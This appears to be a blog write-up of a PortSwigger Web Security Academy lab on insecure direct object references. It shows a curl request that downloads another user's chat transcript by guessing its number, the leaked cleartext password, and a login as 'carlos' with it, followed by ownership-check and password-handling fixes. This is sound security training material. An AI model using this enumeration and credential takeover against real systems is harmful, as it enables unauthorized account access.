---
layout: post
title: "PortSwigger: Insecure Direct Object References"
date: 2027-09-28 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, idor, horizontal-privilege-escalation, insecure-direct-object-reference, information-disclosure, account-takeover, cwe-639]
---

The [previous IDOR labs](/posts/portswigger-idor-unpredictable-user-ids/) keyed the bug off a `?id=` query parameter on the account page. This one is the same vulnerability class — [CWE-639, Insecure Direct Object Reference](https://cwe.mitre.org/data/definitions/639.html) — but the leaky object isn't a dynamic page at all. It's a **static file served straight off the server's disk**, and the only thing protecting it is a guessable integer in the URL.

## Overview

The lab has a live chat feature that lets you download a transcript of your conversation. The goal is to read someone else's transcript, recover the password it leaks, and log in as `carlos`.

## The tell

Open `/chat` and look at how the "View transcript" button works — the page source wires it up to a download endpoint:

```html
<script src="/resources/js/viewTranscript.js"></script>
<script>viewTranscript('/download-transcript')</script>
```

Every saved chat ends up at `/download-transcript/<n>.txt`, where `<n>` is a plain incrementing number. That's a **direct object reference**: the file is named by a predictable id, and the server hands it over without checking who's asking.

## The attack

Request transcript `1` directly — no session, no account needed:

```
$ curl -s "$U/download-transcript/1.txt"
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password...
...
You: Ok so my password is vad1pmcnibvb4skckp1w. Is that right?
Hal Pline: Yes it is!
```

The transcript belongs to another user, and they handed their **cleartext password** to the support bot mid-conversation. Reading a file we were never authorized to read just became account takeover.

Log in with the leaked credentials:

```
POST /login
csrf=<csrf>&username=carlos&password=vad1pmcnibvb4skckp1w
→ HTTP/2 302
```

That `302` is the proof: the login form only redirects on a **correct** password (a wrong one re-renders the form with `200` and an "Invalid username or password" error). The lab status flips to **Solved**.

## Why "unpredictable" doesn't save you either

Worth noting how this generalizes. The fix many developers reach for — swap the integer `1.txt` for an unguessable GUID — only raises the bar; it isn't the control. If that GUID ever leaks (a link, an API response, a log), the file is exposed again, because the server *still* never checks ownership. The only real fix is authorization.

## The fix

- **Authorize every object access against the session owner.** Serve a transcript only if it belongs to the logged-in user — `WHERE owner = session.userId`.
- Use unguessable identifiers (GUIDs) as defence-in-depth, never *as* the access control.
- **Never store or echo cleartext passwords.** The chat persisting a password in plaintext is what turned a transcript leak into a full takeover.

## CWE

[CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html) — the object (a transcript file) is referenced by an attacker-controllable key with no per-request ownership check.
